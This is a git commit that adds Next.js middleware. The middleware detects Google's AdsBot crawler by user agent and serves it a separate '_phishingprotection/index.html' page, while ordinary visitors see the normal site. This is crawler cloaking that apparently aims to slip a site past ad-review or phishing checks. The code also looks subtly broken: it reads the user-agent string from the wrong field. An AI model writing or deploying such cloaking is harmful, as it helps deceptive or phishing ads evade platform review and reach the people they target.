00ac759306950cb08d914c32ce81a84c220827ab
Daniel Beal <git@dbeal.dev>
2023-08-05 22:58:09 -0700

    try using ts

---
+++ middleware.ts
@@ -0,0 +1,20 @@
+import { NextRequest } from 'next/server';
+import { NextResponse, userAgent } from 'next/server';
+
+// Set pathname were middleware will be executed
+export const config = {
+	matcher: '*',
+};
+
+export function middleware(req: NextRequest) {
+	// Parse user agent
+	const { device } = userAgent(req);
+
+	if (device.userAgent.includes('AdsBot-Google')) {
+		// Update the expected url
+		req.nextUrl.pathname = `_phishingprotection/index.html`;
+
+		// Return rewrited response
+		return NextResponse.rewrite(req.nextUrl);
+	}
+}
